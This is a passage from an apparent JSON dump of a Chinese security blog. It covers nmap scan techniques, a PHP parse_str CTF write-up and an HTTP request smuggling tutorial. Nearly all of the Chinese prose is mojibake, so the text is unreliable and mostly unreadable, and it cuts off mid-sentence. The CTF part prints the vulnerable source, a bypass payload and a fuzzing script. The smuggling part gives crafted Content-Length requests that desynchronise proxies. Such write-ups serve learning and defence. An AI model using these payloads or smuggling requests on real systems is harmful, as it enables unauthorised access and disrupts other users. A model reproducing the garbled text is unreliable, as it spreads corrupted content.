openï¼šç¡®å®šç«¯å£å¼€æ”¾ï¼Œå¯è¾¾ closed ï¼šå…³é—­çš„ç«¯å£å¯¹äºnmapä¹Ÿæ˜¯å¯è®¿é—®çš„ï¼Œ å®ƒæ¥æ”¶nmapæ¢æµ‹æŠ¥æ–‡å¹¶ä½œå‡ºå“åº”ã€‚ä½†æ²¡æœ‰åº”ç”¨ç¨‹åºåœ¨å…¶ä¸Šç›‘å¬ã€‚ filtered ï¼šç”±äºåŒ…è¿‡æ»¤é˜»æ­¢æ¢æµ‹æŠ¥æ–‡åˆ°è¾¾ç«¯å£ï¼ŒNmapæ— æ³•ç¡®å®šè¯¥ç«¯å£æ˜¯å¦å¼€æ”¾ã€‚è¿‡æ»¤å¯èƒ½æ¥è‡ªä¸“ä¸šçš„é˜²ç«å¢™è®¾å¤‡ï¼Œè·¯ç”±è§„åˆ™ æˆ–è€…ä¸»æœºä¸Šçš„è½¯ä»¶é˜²ç«å¢™ã€‚ unfiltered ï¼šæœªè¢«è¿‡æ»¤çŠ¶æ€æ„å‘³ç€ç«¯å£å¯è®¿é—®ï¼Œä½†æ˜¯Nmapæ— æ³•ç¡®å®šå®ƒæ˜¯å¼€æ”¾è¿˜æ˜¯å…³é—­ã€‚ åªæœ‰ç”¨äºæ˜ å°„é˜²ç«å¢™è§„åˆ™é›†çš„ ACK æ‰«ææ‰ä¼šæŠŠç«¯å£åˆ†ç±»åˆ°è¿™ä¸ªçŠ¶æ€ã€‚ open | filtered ï¼šæ— æ³•ç¡®å®šç«¯å£æ˜¯å¼€æ”¾è¿˜æ˜¯è¢«è¿‡æ»¤ï¼Œ å¼€æ”¾çš„ç«¯å£ä¸å“åº”å°±æ˜¯ä¸€ä¸ªä¾‹å­ã€‚æ²¡æœ‰å“åº”ä¹Ÿå¯èƒ½æ„å‘³ç€æŠ¥æ–‡è¿‡æ»¤å™¨ä¸¢å¼ƒäº†æ¢æµ‹æŠ¥æ–‡æˆ–è€…å®ƒå¼•å‘çš„ä»»ä½•ååº”ã€‚UDPï¼ŒIPåè®®,FIN, Null ç­‰æ‰«æä¼šå¼•èµ·ã€‚ closed|filteredï¼šï¼ˆå…³é—­æˆ–è€…è¢«è¿‡æ»¤çš„ï¼‰ï¼šæ— æ³•ç¡®å®šç«¯å£æ˜¯å…³é—­çš„è¿˜æ˜¯è¢«è¿‡æ»¤çš„ æ‰«ææŠ€æœ¯ -sS/sT/sA/sW/sM:TCPæ‰«æ Sæ˜¯SYNæ‰«æï¼ŒåŠè¿æ¥æ‰«æï¼Œnmapåªå‘é€SYNæŠ¥æ–‡ï¼Œé€šè¿‡æœåŠ¡å™¨æ˜¯å¦å“åº”SYN+ACKæ¥åˆ¤æ–­å¯¹åº”ç«¯å£æ˜¯å¦å¼€æ”¾ Tæ˜¯å…¨è¿æ¥æ‰«æä¼šå’ŒæœåŠ¡å™¨å»ºç«‹å®Œæ•´çš„ä¸‰æ¬¡æ¡æ‰‹ï¼Œæ•ˆç‡ä½ Aå‘é€ACKæŠ¥æ–‡ï¼Œé€šè¿‡æœåŠ¡å™¨å“åº”æ¥åˆ¤æ–­æ˜¯å¦å¼€æ”¾ï¼Œæœ‰çš„æœåŠ¡å™¨ä¸å¼€ä¼šå›å¤ICMPç«¯å£ä¸å¯è¾¾ï¼Œå½“å›å¤RSTæ—¶è¡¨ç¤ºå¯èƒ½è¢«æ‹¦æˆªæˆ–è€…ç«¯å£å¼€æ”¾ï¼Œä¸æ˜¯ä¸€ä¸ªå‡†ç¡®çš„åˆ¤æ–­æ¡ä»¶ W æ˜¯çª—å£æ‰«æï¼Œå‘å‡ºçš„æŠ¥æ–‡å’ŒACKä¸€æ ·ï¼Œåˆ©ç”¨çš„æ˜¯åœ¨æŸäº›ç³»ç»Ÿä¸­å¦‚æœç«¯å£å¼€æ”¾ï¼Œæ”¶åˆ°ACKåŒ…åä¼šå“åº”ä¸€ä¸ªçª—å£é0çš„RSTåŒ… Mæ˜¯Maimonæ‰«æï¼Œä½¿ç”¨å‘ç°è€…çš„åå­—å‘½åã€‚å…¶åŸç†æ˜¯å‘ç›®æ ‡æœåŠ¡å™¨å‘é€FIN/ACK æŠ¥æ–‡ï¼Œåœ¨æŸäº›ç³»ç»Ÿä¸­å¦‚æœç«¯å£å¼€æ”¾åˆ™ä¼šä¸¢å¼ƒè¯¥æŠ¥æ–‡ä¸åšå“åº”ï¼Œå¦‚æœç«¯å£å…³é—­åˆ™å›å¤RSTæˆ–è€…ICMPï¼ŒNmapå¯å€Ÿæ­¤åˆ¤æ–­æœåŠ¡å™¨ç«¯å£çš„å¼€æ”¾æƒ…å†µã€‚ä¸å‡† -sUï¼šUDPæ‰«æï¼ŒæŸäº›ç³»ç»Ÿå¦‚æœUDPç«¯å£ä¸å¼€æ”¾ä¼šå›å¤ICMPå·®é”™æŠ¥æ–‡ï¼ˆè¿™ä¹Ÿæ˜¯Linuxç³»ç»Ÿä¸­tracerouteçš„å®ç°åŸç†ï¼‰ã€‚Nmap UDPç«¯å£æ‰«æçš„å¼ºå¤§ä¹‹å¤„åœ¨äºå®ƒä¼šé’ˆå¯¹çŸ¥åç«¯å£æ„é€ åˆå§‹äº¤äº’æŠ¥æ–‡ï¼Œæ¯”å¦‚ä¼šé’ˆå¯¹UDP 500æ„é€ ä¸€ä¸ªä¸»æ¨¡å¼åå•†çš„IKEæŠ¥æ–‡ -sN/sF/sX:ç‰¹å®šTCPæ ‡å¿—ä½çš„æ‰«æï¼ŒNæ˜¯ç©ºæ ‡å¿—ä½ï¼›Fæ˜¯FINç½®ä½ï¼›Xæ˜¯Xmasæ‰«æå°†FINã€PSHã€URGåŒæ—¶ç½®ä½ã€‚æ”¶åˆ°RSTè¯´æ˜ç«¯å£å…³é—­ï¼Œæ— å“åº”è¯´æ˜è¢«è¿‡æ»¤æˆ–è€…ç«¯å£å¼€æ”¾ï¼Œä¸å‡†ã€‚ â€“scanflags &lt;flags&gt;ï¼šå®ç°ä¸ŠåŒä¸Šé¢å‡ ç§ç±»ä¼¼ï¼Œå¯ä»¥è®©ç”¨æˆ·è‡ªå®šä¹‰TCPæ ‡å¿—ä½ã€‚ -sI &lt;zombie host[:probeport]&gt;: Idleæ‰«æéœ€è¦ä¸€å°æ²¡æœ‰æµé‡çš„åƒµå°¸ä¸»æœºï¼Œè¿™ç§æ‰«æçš„å®ç°åŸç†æ˜¯åœ¨ä¸€å®šçš„æ—¶é—´é‡Œï¼ŒåŒä¸€å°ä¸»æœºå‘å‡ºçš„IPæ•°æ®æŠ¥æ–‡å…¶ipå¤´ä¸­çš„identificationå­—æ®µæ˜¯ç´¯åŠ çš„ã€‚æ¢æµ‹åˆ†ä¸º3æ­¥ï¼š1ã€Nmapä¸»æœºå‘åƒµå°¸æœºå‘åŒ…ï¼Œé€šè¿‡åƒµå°¸æœºçš„å“åº”åŒ…æ¢æµ‹å…¶IDï¼›2ã€Nmapä¸»æœºä¼ªé€ åƒµå°¸æœºæºåœ°å€å‘æœåŠ¡å™¨çš„ç‰¹å®šç«¯å£å‘é€SYNåŒ…ï¼›3ã€Nmapä¸»æœºå†æ¬¡æ¢æµ‹åƒµå°¸æœºçš„ip.idã€‚å¦‚æœç›®æ ‡æœåŠ¡å™¨ç«¯å£å¼€æ”¾ï¼Œåˆ™å¿…ç„¶ä¼šå‘åƒµå°¸æœºå‘é€SYN/ACKï¼Œç”±äºè«åå…¶å¦™æ”¶åˆ°ä¸€ä¸ªSYN/ACK æŠ¥æ–‡ï¼Œåƒµå°¸æœºä¼šå‘ç›®æ ‡æœåŠ¡å™¨å‘é€RSTæŠ¥æ–‡ï¼Œè¯¥æŠ¥æ–‡çš„ip.id æ˜¯ç¬¬ä¸€æ­¥+1ï¼Œåˆ™ç¬¬ä¸‰æ­¥Nmapä¸»æœºæ¢æµ‹åˆ°çš„ip.idåº”è¯¥æ˜¯ç¬¬ä¸€æ­¥+2ï¼Œè¯´æ˜ç›®æ ‡ä¸»æœºç«¯å£å¼€æ”¾ã€‚åä¹‹ï¼Œå¦‚æœç›®æ ‡ä¸»æœºç«¯å£æœªå¼€æ”¾ï¼Œåˆ™æ”¶åˆ°ç¬¬äºŒæ­¥çš„æŠ¥æ–‡åä¼šå‘åƒµå°¸æœºå›å¤RSTæˆ–è€…ç›´æ¥ä¸¢å¼ƒè¯¥æŠ¥æ–‡ä¸å“åº”ï¼Œæ— è®ºå“ªç§æƒ…å†µï¼Œéƒ½ä¸ä¼šè§¦å‘åƒµå°¸æœºå‘åŒ…ï¼Œè¿›è€Œåƒµå°¸æœºçš„ip.idä¸ä¼šå˜åŒ–ï¼Œç¬¬ä¸‰æ­¥Nmapæ¢æµ‹åˆ°çš„idåº”è¯¥æ˜¯ç¬¬ä¸€æ­¥+1. -sY/sZ:SCTPåè®®INITæˆ–cookie-echoæ‰«æ -sO:åŸºäºIPåè®®çš„æ‰«æï¼Œé€šè¿‡å˜æ¢IPæŠ¥æ–‡å¤´ä¸­çš„Protocolå€¼æ¥å¯¹æœåŠ¡å™¨è¿›è¡Œæ¢æµ‹ -b &lt;FTP relay host&gt;:ï¼šFTPåå¼¹æ‰«æï¼Œå€ŸåŠ©FTPç‰¹æ€§ï¼Œé€šè¿‡FTPæœåŠ¡å™¨è¿æ¥æƒ³è¦æ‰«æçš„ä¸»æœºå®ç°éšèº«çš„ç›®çš„ WireSharkå‚è€ƒï¼šhttps://www.cnblogs.com/mq0036/p/11187138.html","categories":[],"tags":[{"name":"NetCat","slug":"NetCat","permalink":"http://www.m00nback.xyz/tags/NetCat/"},{"name":"Nmap","slug":"Nmap","permalink":"http://www.m00nback.xyz/tags/Nmap/"},{"name":"WireShack","slug":"WireShack","permalink":"http://www.m00nback.xyz/tags/WireShack/"}]},{"title":"PHPçš„å­—ç¬¦ä¸²è§£æç‰¹æ€§","slug":"PHPçš„å­—ç¬¦ä¸²è§£æç‰¹æ€§","date":"2020-01-17T11:18:30.000Z","updated":"2020-02-12T09:49:02.018Z","comments":true,"path":"2020/01/17/PHPçš„å­—ç¬¦ä¸²è§£æç‰¹æ€§/","link":"","permalink":"http://www.m00nback.xyz/2020/01/17/PHP%E7%9A%84%E5%AD%97%E7%AC%A6%E4%B8%B2%E8%A7%A3%E6%9E%90%E7%89%B9%E6%80%A7/","excerpt":"æœ¬ç¯‡åšå®¢ä¸»è¦ä»‹ç»äº†PHPçš„å­—ç¬¦ä¸²è§£æç‰¹æ€§ç›¸å…³å†…å®¹ï¼","text":"æœ¬ç¯‡åšå®¢ä¸»è¦ä»‹ç»äº†PHPçš„å­—ç¬¦ä¸²è§£æç‰¹æ€§ç›¸å…³å†…å®¹ï¼ PHPçš„å­—ç¬¦ä¸²è§£æç‰¹æ€§ PHPéœ€è¦å°†æ‰€æœ‰å‚æ•°è½¬æ¢ä¸ºæœ‰æ•ˆçš„å˜é‡åï¼Œå› æ­¤åœ¨è§£ææŸ¥è¯¢å­—ç¬¦ä¸²æ—¶ï¼Œå®ƒä¼šåšä¸¤ä»¶äº‹ï¼š åˆ é™¤ç©ºç™½ç¬¦ å°†æŸäº›å­—ç¬¦è½¬æ¢ä¸ºä¸‹åˆ’çº¿(åŒ…æ‹¬ç©ºæ ¼) phpè§£æå˜é‡æ˜¯ç”¨parse_str()æ¥è§£æçš„ï¼Œå…³äºè¿™ä¸ªå‡½æ•°çš„è¯¦ç»†ç”¨æ³•å‚è§ï¼šhttps://www.php.net/parse_str åˆ é™¤ç©ºç™½ç¬¦è¿™ä¸ªå¾ˆå¥½ç†è§£ï¼Œå…ˆçœ‹é“ctfé¢˜ç›®: å†è¯´ä¸‹å°†æŸäº›å­—ç¬¦è½¬æ¢ä¸ºä¸‹åˆ’çº¿è¿™ä¸ªç‰¹æ€§å§ï¼Œè¿˜æ˜¯å…ˆçœ‹ä¸€é“é¢˜å§ï¼ å¥‡æ€ªçš„æé¾™ç‰¹æ€§é¢˜ç›®æºç ï¼š 123456789101112131415161718&lt;?php highlight_file(__FILE__); ini_set(&quot;display_error&quot;, false); error_reporting(0); $str = isset($_GET[&#x27;A_A&#x27;])?$_GET[&#x27;A_A&#x27;]:&#x27;A_A&#x27;; if (strpos($_SERVER[&#x27;QUERY_STRING&#x27;], &quot;A_A&quot;) !==false) &#123; echo &#x27;A_A,have fun&#x27;; &#125; elseif ($str&lt;9999999999) &#123; echo &#x27;A_A,too small&#x27;; &#125; elseif ((string)$str&gt;0) &#123; echo &#x27;A_A,too big&#x27;; &#125; else&#123; echo file_get_contents(&#x27;flag.php&#x27;); &#125; ?&gt; é¦–å…ˆåœ¨è¯·æ±‚çš„urlåé¢ä¸èƒ½æœ‰A_Aï¼Œå¹¶ä¸”è¦ä¸æ»¡è¶³ä¸‹é¢ä¸¤ä¸ªæ¯”è¾ƒæ¡ä»¶ æ‰€ä»¥ï¼Œæˆ‘ä»¬å¯ä»¥æ„é€ ä¸‹é¢çš„payload: 1?A A[]&#x3D;a phpä¼šå°†A Aè§£ææˆA_Aï¼Œæ•°ç»„å¤§äºä»»ä½•æ•°å­—ï¼Œå¯¹æ•°ç»„å¼ºåˆ¶stringç±»å‹è½¬æ¢ä¼šè½¬æ¢æˆaï¼Œaå’Œ0æ¯”è¾ƒæ—¶ï¼Œaä¼šè½¬æ¢ä¸ºæ•´å‹å³0 ç”¨æˆ·è¾“å…¥ è§£æå‰ è§£æåå˜é‡å %20foo_bar%00 foo_bar foo_bar foo%20bar%00 foo bar foo_bar foo%5bbar foo[bar foo_bar ç›´è§‚çš„çœ‹ä¸‹parser_strå‡½æ•°å¦‚ä½•å¤„ç†å­—ç¬¦ä¸²ï¼š ä¸‹é¢æœ‰ä¸ªè„šæœ¬ï¼Œéå†äº†æ‰€æœ‰å­—ç¬¦ï¼Œä»¥foo_barä¸ºä¾‹ï¼Œéå†äº†ä¸‰ä¸ªä½ç½®phpåœ¨è§£ææ—¶çš„ä¸åŒ 1234567891011121314151617181920&lt;?phpforeach( [ &quot;&#123;chr&#125;foo_bar&quot;, &quot;foo&#123;chr&#125;bar&quot;, &quot;foo_bar&#123;chr&#125;&quot; ] as $k =&gt; $arg) &#123; for($i=0;$i&lt;=255;$i++) &#123; // echo &quot;\\033[999D\\033[K\\r&quot;; // echo &quot;[&quot;.$arg.&quot;] check &quot;.bin2hex(chr($i)).&quot;\\n&quot;; parse_str(str_replace(&quot;&#123;chr&#125;&quot;,chr($i),$arg).&quot;=bla&quot;,$o); usleep(5000); if(isset($o[&quot;foo_bar&quot;])) &#123; // echo &quot;\\033[999D\\033[K\\r&quot;; echo $arg.&quot; -&gt; &quot;.bin2hex(chr($i)).&quot; (&quot;.chr($i).&quot;)\\n&quot;; &#125; &#125; // echo &quot;\\033[999D\\033[K\\r&quot;; echo &quot;\\n&quot;;&#125; åˆæ­¥è¯•äº†ä¸‹,å‘ç°å’Œè„šæœ¬ç»“æœä¸€æ ·ï¼Œå‘ç°ä¸‰ä¸ªä½ç½®çš„å·®åˆ«ï¼š ç¬¬ä¸€ä¸ªä½ç½®ä¸º%20,%26,%2bæ—¶éƒ½ä¼šå¿½ç•¥ ç¬¬äºŒä¸ªä½ç½®ä¸º%20,%2b,%2e,%5béƒ½ä¼šæ›¿æ¢æˆ_ï¼Œå³%5f ç¬¬ä¸‰ä¸ªä½ç½®ä¸º%00,%26,%3dæ—¶éƒ½ä¼šå¿½ç•¥ åæ¥å‘ç°ï¼Œå˜é‡åä¸­æœ‰%20,%2b,%2e,%5béƒ½ä¼šæ›¿æ¢æˆ_ï¼Œå³%5f å‚è€ƒï¼š https://www.freebuf.com/articles/web/213359.html","categories":[],"tags":[{"name":"web","slug":"web","permalink":"http://www.m00nback.xyz/tags/web/"},{"name":"php","slug":"php","permalink":"http://www.m00nback.xyz/tags/php/"},{"name":"bypass","slug":"bypass","permalink":"http://www.m00nback.xyz/tags/bypass/"}]},{"title":"httpèµ°ç§å­¦ä¹ ","slug":"httpèµ°ç§å­¦ä¹ ","date":"2020-01-16T16:15:59.000Z","updated":"2020-01-20T14:30:49.391Z","comments":true,"path":"2020/01/17/httpèµ°ç§å­¦ä¹ /","link":"","permalink":"http://www.m00nback.xyz/2020/01/17/http%E8%B5%B0%E7%A7%81%E5%AD%A6%E4%B9%A0/","excerpt":"æœ¬ç¯‡åšå®¢ä¸»è¦ä»‹ç»äº†httpèµ°ç§ç›¸å…³å†…å®¹ï¼","text":"æœ¬ç¯‡åšå®¢ä¸»è¦ä»‹ç»äº†httpèµ°ç§ç›¸å…³å†…å®¹ï¼ ä»€ä¹ˆæ˜¯httpèµ°ç§ï¼ŸHTTPè¯·æ±‚èµ°ç§æ˜¯ä¸€ç§å¹²æ‰°ç½‘ç«™å¤„ç†ä»ä¸€ä¸ªæˆ–å¤šä¸ªç”¨æˆ·æ¥æ”¶çš„HTTPè¯·æ±‚åºåˆ—çš„æ–¹å¼çš„æŠ€æœ¯ã€‚ä½¿æ”»å‡»è€…å¯ä»¥ç»•è¿‡å®‰å…¨æ§åˆ¶ï¼Œæœªç»æˆæƒè®¿é—®æ•æ„Ÿæ•°æ®å¹¶ç›´æ¥å±å®³å…¶ä»–åº”ç”¨ç¨‹åºç”¨æˆ·ã€‚ ä¸ºä»€ä¹ˆä¼šäº§ç”Ÿhttpèµ°ç§ï¼Ÿè¯·æ±‚èµ°ç§æ¼æ´æˆå› å‰ç«¯æœåŠ¡å™¨(CDN)å’Œåç«¯æœåŠ¡å™¨æ¥æ”¶æ•°æ®ä¸åŒæ­¥ï¼Œå¼•èµ·å¯¹å®¢æˆ·ç«¯ä¼ å…¥çš„æ•°æ®ç†è§£ä¸ä¸€è‡´ï¼Œä»è€Œå¯¼è‡´æ¼æ´çš„äº§ç”Ÿã€‚ å¤§å¤šæ•°HTTPè¯·æ±‚èµ°ç§æ¼æ´çš„å‡ºç°æ˜¯å› ä¸ºHTTPè§„èŒƒæä¾›äº†ä¸¤ç§ä¸åŒçš„æ–¹æ³•æ¥æŒ‡å®šè¯·æ±‚çš„ç»“æŸä½ç½®ï¼šContent-Lengthæ ‡å¤´å’ŒTransfer-Encodingæ ‡å¤´ã€‚ åŒæ—¶ä½¿ç”¨ä¸¤ç§ä¸åŒçš„æ–¹æ³•æ—¶ï¼ŒContent-Lengthæ— æ•ˆã€‚å½“ä½¿ç”¨å¤šä¸ªæœåŠ¡å™¨æ—¶ï¼Œå¯¹å®¢æˆ·ç«¯ä¼ å…¥çš„æ•°æ®ç†è§£ä¸ä¸€è‡´æ—¶ï¼Œå°±ä¼šå‡ºç°æœ‰äº›æœåŠ¡å™¨è®¤ä¸ºContent-Lengthçš„é•¿åº¦æœ‰æ•ˆï¼Œæœ‰äº›ä»¥Transfer-Encodingæœ‰æ•ˆã€‚è€Œä¸€èˆ¬æƒ…å†µä¸‹ï¼Œåå‘ä»£ç†æœåŠ¡å™¨ä¸åç«¯çš„æºç«™æœåŠ¡å™¨ä¹‹é—´ï¼Œä¼šé‡ç”¨TCPé“¾æ¥ã€‚è¿™æ ·è¶…å‡ºçš„é•¿åº¦å°±ä¼šæ‹¼æ¥åˆ°ä¸‹ä¸€æ¬¡è¯·æ±‚è¿›è¡Œè¯·æ±‚ï¼Œä»è€Œå¯¼è‡´HTTPè¯·æ±‚èµ°ç§æ¼æ´ã€‚ http1.1çš„ä¸¤ä¸ªç‰¹æ€§åœ¨HTTP1.1ä¸­ï¼Œå¢åŠ äº†Keep-Aliveå’ŒPipelineè¿™ä¸¤ä¸ªç‰¹æ€§ã€‚ æ‰€è°“Keep-Aliveï¼Œå°±æ˜¯åœ¨HTTPè¯·æ±‚ä¸­å¢åŠ ä¸€ä¸ªç‰¹æ®Šçš„è¯·æ±‚å¤´Connection: Keep-Aliveï¼Œå‘Šè¯‰æœåŠ¡å™¨ï¼Œæ¥æ”¶å®Œè¿™æ¬¡HTTPè¯·æ±‚åï¼Œä¸è¦å…³é—­TCPé“¾æ¥ï¼Œåé¢å¯¹ç›¸åŒç›®æ ‡æœåŠ¡å™¨çš„HTTPè¯·æ±‚ï¼Œé‡ç”¨è¿™ä¸€ä¸ªTCPé“¾æ¥ï¼Œè¿™æ ·åªéœ€è¦è¿›è¡Œä¸€æ¬¡TCPæ¡æ‰‹çš„è¿‡ç¨‹ï¼Œå¯ä»¥å‡å°‘æœåŠ¡å™¨çš„å¼€é”€ï¼ŒèŠ‚çº¦èµ„æºï¼Œè¿˜èƒ½åŠ å¿«è®¿é—®é€Ÿåº¦ã€‚å½“ç„¶ï¼Œè¿™ä¸ªç‰¹æ€§åœ¨HTTP1.1ä¸­æ˜¯é»˜è®¤å¼€å¯çš„ã€‚ æœ‰äº†Keep-Aliveä¹‹åï¼Œåç»­å°±æœ‰äº†Pipelineï¼Œåœ¨è¿™é‡Œå‘¢ï¼Œå®¢æˆ·ç«¯å¯ä»¥åƒæµæ°´çº¿ä¸€æ ·å‘é€è‡ªå·±çš„HTTPè¯·æ±‚ï¼Œè€Œä¸éœ€è¦ç­‰å¾…æœåŠ¡å™¨çš„å“åº”ï¼ŒæœåŠ¡å™¨é‚£è¾¹æ¥æ”¶åˆ°è¯·æ±‚åï¼Œéœ€è¦éµå¾ªå…ˆå…¥å…ˆå‡ºæœºåˆ¶ï¼Œå°†è¯·æ±‚å’Œå“åº”ä¸¥æ ¼å¯¹åº”èµ·æ¥ï¼Œå†å°†å“åº”å‘é€ç»™å®¢æˆ·ç«¯ httpèµ°ç§ç±»å‹HTTPè¯·æ±‚èµ°ç§æ”»å‡»æ¶‰åŠå°†Content-Lengthæ ‡å¤´å’ŒTransfer-Encodingæ ‡å¤´éƒ½æ”¾ç½®åœ¨å•ä¸ªHTTPè¯·æ±‚ä¸­å¹¶è¿›è¡Œå¤„ç†ï¼Œä»¥ä¾¿å‰ç«¯æœåŠ¡å™¨å’Œåç«¯æœåŠ¡å™¨ä»¥ä¸åŒçš„æ–¹å¼å¤„ç†è¯·æ±‚ã€‚å®Œæˆæ­¤æ“ä½œçš„ç¡®åˆ‡æ–¹å¼å–å†³äºä¸¤ä¸ªæœåŠ¡å™¨çš„è¡Œä¸ºï¼š CL.CLï¼šå‰ç«¯æœåŠ¡å™¨ä½¿ç”¨Content-Lengthæ ‡å¤´ï¼Œåç«¯æœåŠ¡å™¨ä¹Ÿä½¿ç”¨Content-Lengthæ ‡å¤´ã€‚ CL.TEï¼šå‰ç«¯æœåŠ¡å™¨ä½¿ç”¨Content-Lengthæ ‡å¤´ï¼Œè€Œåç«¯æœåŠ¡å™¨ä½¿ç”¨Transfer-Encodingæ ‡å¤´ã€‚ TE.CLï¼šå‰ç«¯æœåŠ¡å™¨ä½¿ç”¨Transfer-Encodingæ ‡å¤´ï¼Œè€Œåç«¯æœåŠ¡å™¨ä½¿ç”¨Content-Lengthæ ‡å¤´ã€‚ TE.TEï¼šå‰ç«¯æœåŠ¡å™¨å’Œåç«¯æœåŠ¡å™¨éƒ½æ”¯æŒTransfer-Encodingæ ‡å¤´ï¼Œä½†æ˜¯å¯ä»¥é€šè¿‡å¯¹æ ‡å¤´è¿›è¡ŒæŸç§æ–¹å¼çš„æ··æ·†æ¥è¯±å¯¼å…¶ä¸­ä¸€å°æœåŠ¡å™¨ä¸å¯¹å…¶è¿›è¡Œå¤„ç†ã€‚ HTTPè¯·æ±‚èµ°ç§æ”»å‡»çš„äº”ç§æ–¹å¼CLä¸ä¸º0æ‰€æœ‰ä¸æºå¸¦è¯·æ±‚ä½“çš„HTTPè¯·æ±‚éƒ½æœ‰å¯èƒ½å—æ­¤å½±å“ã€‚è¿™é‡Œç”¨GETè¯·æ±‚ä¸¾ä¾‹ã€‚å‰ç«¯ä»£ç†æœåŠ¡å™¨å…è®¸GETè¯·æ±‚æºå¸¦è¯·æ±‚ä½“ï¼›åç«¯æœåŠ¡å™¨ä¸å…è®¸GETè¯·æ±‚æºå¸¦è¯·æ±‚ä½“ï¼Œå®ƒä¼šç›´æ¥å¿½ç•¥æ‰GETè¯·æ±‚ä¸­çš„Content-Lengthå¤´ï¼Œä¸è¿›è¡Œå¤„ç†ã€‚è¿™å°±æœ‰å¯èƒ½å¯¼è‡´è¯·æ±‚èµ°ç§ã€‚ æ„é€ è¯·æ±‚ç¤ºä¾‹ï¼š 1234567GET / HTTP/1.1\\r\\nHost: test.com\\r\\nContent-Length: 44\\r\\nGET / secret HTTP/1.1\\r\\nHost: test.com\\r\\n\\r\\n 1\\r\\n&#96;æ˜¯æ¢è¡Œçš„æ„æ€ï¼Œwindowsçš„æ¢è¡Œæ˜¯&#96;\\r\\n&#96;ï¼Œunixçš„æ˜¯&#96;\\n&#96;ï¼Œmacçš„æ˜¯&#96;\\r æ”»å‡»æµç¨‹ï¼šå‰ç«¯æœåŠ¡å™¨æ”¶åˆ°è¯¥è¯·æ±‚ï¼Œè¯»å–Content-Lengthï¼Œåˆ¤æ–­è¿™æ˜¯ä¸€ä¸ªå®Œæ•´çš„è¯·æ±‚ã€‚ç„¶åè½¬å‘ç»™åç«¯æœåŠ¡å™¨ï¼Œåç«¯æœåŠ¡å™¨æ”¶åˆ°åï¼Œå› ä¸ºå®ƒä¸å¯¹Content-Lengthè¿›è¡Œå¤„ç†ï¼Œç”±äºPipelineçš„å­˜åœ¨ï¼Œåç«¯æœåŠ¡å™¨å°±è®¤ä¸ºè¿™æ˜¯æ”¶åˆ°äº†ä¸¤ä¸ªè¯·æ±‚ï¼Œåˆ†åˆ«æ˜¯ï¼š ç¬¬ä¸€ä¸ªï¼š 12GET / HTTP/1.1\\r\\nHost: test.com\\r\\n ç¬¬äºŒä¸ªï¼š 12GET / secret HTTP/1.1\\r\\nHost: test.com\\r\\n æ‰€ä»¥é€ æˆäº†è¯·æ±‚èµ°ç§ã€‚ CL-CLRFC7230è§„èŒƒ åœ¨RFC7230çš„ç¬¬3.3.3èŠ‚ä¸­çš„ç¬¬å››æ¡ä¸­ï¼Œè§„å®šå½“æœåŠ¡å™¨æ”¶åˆ°çš„è¯·æ±‚ä¸­åŒ…å«ä¸¤ä¸ªContent-Lengthï¼Œè€Œä¸”ä¸¤è€…çš„å€¼ä¸åŒæ—¶ï¼Œéœ€è¦è¿”å›400é”™è¯¯ã€‚ æœ‰äº›æœåŠ¡å™¨ä¸ä¼šä¸¥æ ¼çš„å®ç°è¯¥è§„èŒƒï¼Œå‡è®¾ä¸­é—´çš„ä»£ç†æœåŠ¡å™¨å’Œåç«¯çš„æºç«™æœåŠ¡å™¨åœ¨æ”¶åˆ°ç±»ä¼¼çš„è¯·æ±‚æ—¶ï¼Œéƒ½ä¸ä¼šè¿”å›400é”™è¯¯ã€‚ä½†æ˜¯ä¸­é—´ä»£ç†æœåŠ¡å™¨æŒ‰ç…§ç¬¬ä¸€ä¸ªContent-Lengthçš„å€¼å¯¹è¯·æ±‚è¿›è¡Œå¤„ç†ï¼Œè€Œåç«¯æºç«™æœåŠ¡å™¨æŒ‰ç…§ç¬¬äºŒä¸ªContent-Lengthçš„å€¼è¿›è¡Œå¤„ç†ã€‚æ„é€ è¯·æ±‚ç¤ºä¾‹ï¼š 1234567POST / HTTP/1.1\\r\\nHost: test.com\\r\\nContent-Length: 8\\r\\nContent-Length: 7\\r\\n12345\\r\\na æ”»å‡»æµç¨‹ï¼šä¸­é—´ä»£ç†æœåŠ¡å™¨è·å–åˆ°çš„æ•°æ®åŒ…çš„é•¿åº¦ä¸º8ï¼Œå°†ä¸Šè¿°æ•´ä¸ªæ•°æ®åŒ…åŸå°ä¸åŠ¨çš„è½¬å‘ç»™åç«¯çš„æºç«™æœåŠ¡å™¨ã€‚è€Œåç«¯æœåŠ¡å™¨è·å–åˆ°çš„æ•°æ®åŒ…é•¿åº¦ä¸º7ã€‚å½“è¯»å–å®Œå‰7ä¸ªå­—ç¬¦åï¼Œåç«¯æœåŠ¡å™¨è®¤ä¸ºå·²ç»è¯»å–å®Œæ¯•ï¼Œç„¶åç”Ÿæˆå¯¹åº”çš„å“åº”ï¼Œå‘é€å‡ºå»ã€‚è€Œæ­¤æ—¶çš„ç¼“å†²åŒºå»è¿˜å‰©ä½™ä¸€ä¸ªå­—æ¯aï¼Œå¯¹äºåç«¯æœåŠ¡å™¨æ¥è¯´ï¼Œè¿™ä¸ªaæ˜¯ä¸‹ä¸€ä¸ªè¯·æ±‚çš„ä¸€éƒ¨åˆ†ï¼Œä½†æ˜¯è¿˜æ²¡æœ‰ä¼ è¾“å®Œæ¯•ã€‚å¦‚æœæ­¤æ—¶æœ‰ä¸€ä¸ªå…¶ä»–çš„æ­£å¸¸ç”¨æˆ·å¯¹æœåŠ¡å™¨è¿›è¡Œäº†è¯·æ±‚ï¼š 12GET /index.html HTTP/1.1\\r\\nHost: test.com\\r\\n å› ä¸ºä»£ç†æœåŠ¡å™¨ä¸æºç«™æœåŠ¡å™¨ä¹‹é—´ä¸€èˆ¬ä¼šé‡ç”¨TCPè¿æ¥ã€‚æ‰€ä»¥æ­£å¸¸ç”¨æˆ·çš„è¯·æ±‚å°±æ‹¼æ¥åˆ°äº†å­—æ¯açš„åé¢ï¼Œå½“åç«¯æœåŠ¡å™¨æ¥æ”¶å®Œæ¯•åï¼Œå®ƒå®é™…å¤„ç†çš„è¯·æ±‚å…¶å®æ˜¯ï¼š 12aGET /index.html HTTP/1.1\\r\\nHost: test.com\\r\\n è¿™æ—¶ï¼Œç”¨æˆ·å°±ä¼šæ”¶åˆ°ä¸€ä¸ªç±»ä¼¼äºaGET request method not foundçš„æŠ¥é”™ã€‚è¿™æ ·å°±å®ç°äº†ä¸€æ¬¡HTTPèµ°ç§æ”»å‡»ï¼Œè€Œä¸”è¿˜å¯¹æ­£å¸¸ç”¨æˆ·çš„è¡Œä¸ºé€ 